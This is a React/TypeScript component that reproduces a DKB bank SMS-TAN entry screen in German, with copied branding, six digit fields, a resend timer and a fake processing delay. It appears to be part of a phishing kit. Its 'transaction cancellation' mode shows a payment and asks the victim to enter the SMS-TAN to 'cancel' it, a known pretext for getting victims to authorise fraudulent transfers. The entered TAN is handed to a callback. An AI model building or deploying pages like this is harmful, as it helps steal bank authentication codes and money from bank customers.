import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface SMSTANScreenProps {
  tanType: TANType;
  phoneNumber?: string;
  transactionDetails?: TransactionDetails;
  onSubmit: (tan: string) => void;
  onResend?: () => void;
  onCancel?: () => void;
}

const SMSTANScreen: React.FC<SMSTANScreenProps> = ({
  tanType,
  phoneNumber = 'Ihre registrierte Nummer',
  transactionDetails = {},
  onSubmit,
  onResend,
  onCancel
}) => {
  const [tan, setTan] = useState<string[]>(['', '', '', '', '', '']);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    if (isSubmitting) return;

    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setCanResend(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [isSubmitting]);

  const handleChange = (index: number, value: string) => {
    const newTan = [...tan];
    newTan[index] = value.slice(-1); // Only allow one character
    setTan(newTan);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`tan-input-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !tan[index] && index > 0) {
      const prevInput = document.getElementById(`tan-input-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = async () => {
    const fullTan = tan.join('');
    if (fullTan.length === 6) {
      setIsSubmitting(true);
      await new Promise(resolve => setTimeout(resolve, 1500));
      onSubmit(fullTan);
    }
  };

  const handleResend = () => {
    if (canResend && onResend) {
      setCanResend(false);
      setCountdown(60);
      onResend();
    }
  };

  if (isSubmitting) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'SMS-TAN wird überprüft...'}
        type="processing"
        showProgress={true}
        duration={2}
      />
    );
  }

  return (
    <div className="dkb-main-layout" style={{
      minHeight: '100vh',
      backgroundColor: '#09141c',
      fontFamily: 'DKBEuclid, Arial, sans-serif',
      color: '#edf4f7',
      WebkitFontSmoothing: 'antialiased',
      MozOsxFontSmoothing: 'grayscale'
    }}>
      <div style={{
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        padding: isMobile ? '32px 16px' : '64px 16px',
        minHeight: '100vh'
      }}>
        
        {/* Main SMS TAN Card - DKB Dark Theme */}
        <div style={{
          backgroundColor: '#131f29',
          border: '1px solid rgba(181, 223, 255, 0.2)',
          borderRadius: '12px',
          width: '100%',
          maxWidth: '600px',
          padding: isMobile ? '24px' : '32px',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center'
        }}>
          
          {/* Title */}
          <h1 style={{
            color: '#edf4f7',
            fontSize: isMobile ? '1.75rem' : '2.25rem',
            fontWeight: '600',
            margin: '0 0 32px 0',
            fontFamily: 'DKBEuclid, Arial, sans-serif',
            textAlign: 'center',
            letterSpacing: '0.0125rem'
          }}>
            {tanType === 'TRANSACTION_TAN' ? 'SMS-TAN Stornierung' : 'SMS-TAN Anmeldung'}
          </h1>
          
          {/* Instruction Box */}
          <div style={{
            backgroundColor: '#122534',
            border: '1px solid rgba(20, 141, 234, 0.24)',
            borderRadius: '8px',
            padding: '20px',
            marginBottom: '32px',
            width: '100%',
            textAlign: 'center'
          }}>
            <p style={{
              margin: '0',
              fontSize: isMobile ? '14px' : '16px',
              color: 'rgba(204, 233, 255, 0.62)',
              fontFamily: 'DKBEuclid, Arial, sans-serif',
              lineHeight: '1.5',
              letterSpacing: '0.0125rem'
            }}>
              {tanType === 'TRANSACTION_TAN'
                ? `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Stornierung an ${phoneNumber} gesendet.`
                : `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Anmeldung an ${phoneNumber} gesendet.`
              }
            </p>
          </div>

          {/* Transaction Details Card - only for TRANSACTION_TAN */}
          {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
            <div style={{
              backgroundColor: '#122534',
              border: '1px solid #148DEA',
              borderRadius: '8px',
              padding: '24px',
              marginBottom: '32px',
              width: '100%'
            }}>
              <h2 style={{
                color: '#148DEA',
                fontSize: isMobile ? '1.25rem' : '1.5rem',
                fontWeight: '600',
                margin: '0 0 20px 0',
                fontFamily: 'DKBEuclid, Arial, sans-serif',
                textAlign: 'center',
                letterSpacing: '0.0125rem'
              }}>
                Zu stornierende Transaktion
              </h2>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                <div style={{ 
                  display: 'flex', 
                  justifyContent: 'space-between', 
                  alignItems: 'center',
                  paddingBottom: '12px',
                  borderBottom: '1px solid rgba(181, 223, 255, 0.2)'
                }}>
                  <span style={{
                    color: 'rgba(204, 233, 255, 0.62)',
                    fontSize: '14px',
                    fontFamily: 'DKBEuclid, Arial, sans-serif',
                    letterSpacing: '0.0125rem'
                  }}>Betrag:</span>
                  <span style={{
                    color: '#148DEA',
                    fontSize: '18px',
                    fontFamily: 'DKBEuclid, Arial, sans-serif',
                    fontWeight: '600',
                    letterSpacing: '0.0125rem'
                  }}>{transactionDetails.amount}</span>
                </div>
                
                {transactionDetails.recipient && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '12px',
                    borderBottom: '1px solid rgba(181, 223, 255, 0.2)'
                  }}>
                    <span style={{
                      color: 'rgba(204, 233, 255, 0.62)',
                      fontSize: '14px',
                      fontFamily: 'DKBEuclid, Arial, sans-serif',
                      letterSpacing: '0.0125rem'
                    }}>Empfänger:</span>
                    <span style={{
                      color: '#edf4f7',
                      fontSize: '14px',
                      fontFamily: 'DKBEuclid, Arial, sans-serif',
                      textAlign: 'right',
                      maxWidth: '60%',
                      letterSpacing: '0.0125rem'
                    }}>{transactionDetails.recipient}</span>
                  </div>
                )}
                
                {transactionDetails.iban && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '12px',
                    borderBottom: '1px solid rgba(181, 223, 255, 0.2)'
                  }}>
                    <span style={{
                      color: 'rgba(204, 233, 255, 0.62)',
                      fontSize: '14px',
                      fontFamily: 'DKBEuclid, Arial, sans-serif',
                      letterSpacing: '0.0125rem'
                    }}>IBAN:</span>
                    <span style={{
                      color: '#edf4f7',
                      fontSize: '14px',
                      fontFamily: 'monospace',
                      textAlign: 'right',
                      letterSpacing: '0.05rem'
                    }}>{transactionDetails.iban}</span>
                  </div>
                )}
                
                {transactionDetails.reference && (
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center'
                  }}>
                    <span style={{
                      color: 'rgba(204, 233, 255, 0.62)',
                      fontSize: '14px',
                      fontFamily: 'DKBEuclid, Arial, sans-serif',
                      letterSpacing: '0.0125rem'
                    }}>Verwendungszweck:</span>
                    <span style={{
                      color: '#edf4f7',
                      fontSize: '14px',
                      fontFamily: 'DKBEuclid, Arial, sans-serif',
                      textAlign: 'right',
                      maxWidth: '60%',
                      letterSpacing: '0.0125rem'
                    }}>{transactionDetails.reference}</span>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* TAN Input Section */}
          <div style={{
            backgroundColor: '#122534',
            border: '1px solid rgba(181, 223, 255, 0.2)',
            borderRadius: '8px',
            padding: '32px',
            marginBottom: '32px',
            width: '100%'
          }}>
            <h3 style={{
              color: '#148DEA',
              fontSize: isMobile ? '1.125rem' : '1.25rem',
              fontWeight: '600',
              margin: '0 0 24px 0',
              fontFamily: 'DKBEuclid, Arial, sans-serif',
              textAlign: 'center',
              letterSpacing: '0.0125rem'
            }}>
              {tanType === 'TRANSACTION_TAN' ? 'TAN-Nummer zur Stornierung eingeben:' : 'TAN-Nummer eingeben:'}
            </h3>

            {/* TAN Input Fields */}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: isMobile ? '8px' : '12px',
              marginBottom: '24px',
              flexWrap: 'wrap'
            }}>
              {tan.map((digit, index) => (
                <input
                  key={index}
                  id={`tan-input-${index}`}
                  type="text"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  style={{
                    width: isMobile ? '40px' : '50px',
                    height: isMobile ? '50px' : '60px',
                    fontSize: isMobile ? '1.5rem' : '1.75rem',
                    textAlign: 'center',
                    border: '1px solid rgba(181, 223, 255, 0.2)',
                    borderRadius: '6px',
                    outline: 'none',
                    color: '#148DEA',
                    fontWeight: '600',
                    fontFamily: 'DKBEuclid, Arial, sans-serif',
                    backgroundColor: '#09141c',
                    transition: 'all 0.2s ease',
                    letterSpacing: '0.0125rem'
                  }}
                  onFocus={(e) => {
                    (e.target as HTMLInputElement).style.border = '2px solid #148DEA';
                    (e.target as HTMLInputElement).style.boxShadow = '0 0 0 2px rgba(30, 153, 247, 0.74)';
                  }}
                  onBlur={(e) => {
                    (e.target as HTMLInputElement).style.border = '1px solid rgba(181, 223, 255, 0.2)';
                    (e.target as HTMLInputElement).style.boxShadow = 'none';
                  }}
                  onMouseEnter={(e) => {
                    if (document.activeElement !== e.target) {
                      (e.target as HTMLInputElement).style.backgroundColor = '#122534';
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (document.activeElement !== e.target) {
                      (e.target as HTMLInputElement).style.backgroundColor = '#09141c';
                    }
                  }}
                  disabled={isSubmitting}
                />
              ))}
            </div>

            {/* Submit Button */}
            <div style={{ textAlign: 'center', marginBottom: '20px' }}>
              <button
                onClick={handleSubmit}
                disabled={tan.join('').length !== 6 || isSubmitting}
                style={{
                  backgroundColor: (tan.join('').length !== 6 || isSubmitting) ? '#6c757d' : '#148DEA',
                  color: '#ffffff',
                  border: 'none',
                  padding: '12px 24px',
                  borderRadius: '6px',
                  fontFamily: 'DKBEuclid, Arial, sans-serif',
                  fontWeight: '600',
                  fontSize: '16px',
                  cursor: (tan.join('').length !== 6 || isSubmitting) ? 'not-allowed' : 'pointer',
                  transition: 'background-color 0.2s ease',
                  width: isMobile ? '100%' : 'auto',
                  minWidth: '200px',
                  letterSpacing: '0.0125rem'
                }}
                onMouseEnter={(e) => {
                  if (tan.join('').length === 6 && !isSubmitting) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#134e8a';
                  }
                }}
                onMouseLeave={(e) => {
                  if (tan.join('').length === 6 && !isSubmitting) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#148DEA';
                  }
                }}
              >
                {isSubmitting
                  ? (tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'TAN wird überprüft...')
                  : (tanType === 'TRANSACTION_TAN' ? 'Stornierung bestätigen' : 'TAN bestätigen')
                }
              </button>
            </div>

            {/* Resend Button */}
            {onResend && (
              <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                <button
                  onClick={handleResend}
                  disabled={!canResend || isSubmitting}
                  style={{
                    backgroundColor: 'transparent',
                    color: (!canResend || isSubmitting) ? '#6c757d' : '#148DEA',
                    border: `1px solid ${(!canResend || isSubmitting) ? '#6c757d' : '#148DEA'}`,
                    padding: '12px 24px',
                    borderRadius: '6px',
                    fontFamily: 'DKBEuclid, Arial, sans-serif',
                    fontWeight: '600',
                    fontSize: '16px',
                    cursor: (!canResend || isSubmitting) ? 'not-allowed' : 'pointer',
                    transition: 'all 0.2s ease',
                    width: isMobile ? '100%' : 'auto',
                    minWidth: '200px',
                    letterSpacing: '0.0125rem'
                  }}
                  onMouseEnter={(e) => {
                    if (canResend && !isSubmitting) {
                      (e.target as HTMLButtonElement).style.backgroundColor = '#148DEA';
                      (e.target as HTMLButtonElement).style.color = '#ffffff';
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (canResend && !isSubmitting) {
                      (e.target as HTMLButtonElement).style.backgroundColor = 'transparent';
                      (e.target as HTMLButtonElement).style.color = '#148DEA';
                    }
                  }}
                >
                  TAN erneut senden {canResend ? '' : `(${countdown}s)`}
                </button>
              </div>
            )}

            {/* Cancel Link */}
            {onCancel && (
              <div style={{ textAlign: 'center' }}>
                <a 
                  href="#" 
                  onClick={(e) => {
                    e.preventDefault();
                    onCancel();
                  }}
                  style={{
                    color: '#148DEA',
                    textDecoration: 'none',
                    fontSize: '14px',
                    fontFamily: 'DKBEuclid, Arial, sans-serif',
                    transition: 'color 0.3s ease',
                    letterSpacing: '0.0125rem'
                  }}
                  onMouseEnter={(e) => {
                    (e.target as HTMLAnchorElement).style.color = '#134e8a';
                    (e.target as HTMLAnchorElement).style.textDecoration = 'underline';
                  }}
                  onMouseLeave={(e) => {
                    (e.target as HTMLAnchorElement).style.color = '#148DEA';
                    (e.target as HTMLAnchorElement).style.textDecoration = 'none';
                  }}
                >
                  {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
                </a>
              </div>
            )}
          </div>

          {/* Footer Info */}
          <div style={{ textAlign: 'center' }}>
            <p style={{
              color: 'rgba(204, 233, 255, 0.62)',
              fontSize: '12px',
              margin: '0',
              fontFamily: 'DKBEuclid, Arial, sans-serif',
              letterSpacing: '0.0125rem'
            }}>
              Keine SMS erhalten? Überprüfen Sie Ihren Spam-Ordner oder kontaktieren Sie den DKB Kundenservice.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export { SMSTANScreen };
